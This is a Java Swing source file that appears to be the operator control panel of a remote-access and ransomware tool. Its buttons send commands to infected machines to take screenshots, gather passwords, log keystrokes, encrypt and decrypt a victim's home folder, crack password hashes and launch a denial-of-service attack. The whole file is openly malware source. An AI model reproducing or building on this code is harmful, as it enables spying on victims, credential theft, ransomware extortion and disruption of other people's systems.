package view;

import java.awt.Color;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.Scanner;

import javax.swing.BoxLayout;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JPanel;

import model.Server;

public class ActionPanel extends JPanel {

  private static final long serialVersionUID = 8918020282892448008L;
  
  // size of key for encrypting/decrypting victim's files in bytes
  // (AES)
  private static final int ENCRYPTED_FILE_KEY_SIZE = 32;
  private static final Color BACKGROUND_COLOR = Color.WHITE;

  public ActionPanel(final Server server) {
    setLayout(new BoxLayout(this, BoxLayout.Y_AXIS));

    setBackground(BACKGROUND_COLOR);
    JLabel title = new JLabel("Actions");
    JButton screenshot = new JButton("Take screenshot");
    screenshot.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("143", null);
      }
    });   

    JButton passwords = new JButton("Gather passwords");
    passwords.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("144", null);
      }
    });

    JButton keylog = new JButton("Log keystrokes");
    keylog.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("145", null);
      }
    });

    JButton encrypt = new JButton("Encrypt home folder");
    encrypt.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("146", null);
      }
    });

    JButton decrypt = new JButton("Decrypt home folder");
    decrypt.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {

        final JFileChooser fc = new JFileChooser();
        fc.showOpenDialog(ActionPanel.this);

        char[] bytes = new char[ENCRYPTED_FILE_KEY_SIZE];
        try {
          BufferedReader br = new BufferedReader(new FileReader(fc.getSelectedFile()));
          br.read(bytes, 0, ENCRYPTED_FILE_KEY_SIZE);
          br.close();
        } catch (IOException ioe) {
          ioe.printStackTrace();
        }
        server.sendCommand("147", new String(bytes));
      }
    });

    JButton hash = new JButton("Crack password hash");
    hash.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("148", null);
      }
    });

    JButton dos = new JButton("DOS");
    dos.addMouseListener(new MouseAdapter() {
      @Override
      public void mouseClicked(MouseEvent e) {
        server.sendCommand("149", null);
      }
    });

    add(title);
    add(screenshot);
    add(passwords);
    add(keylog);
    add(encrypt);
    add(decrypt);
    add(hash);
    add(dos);
  }
}
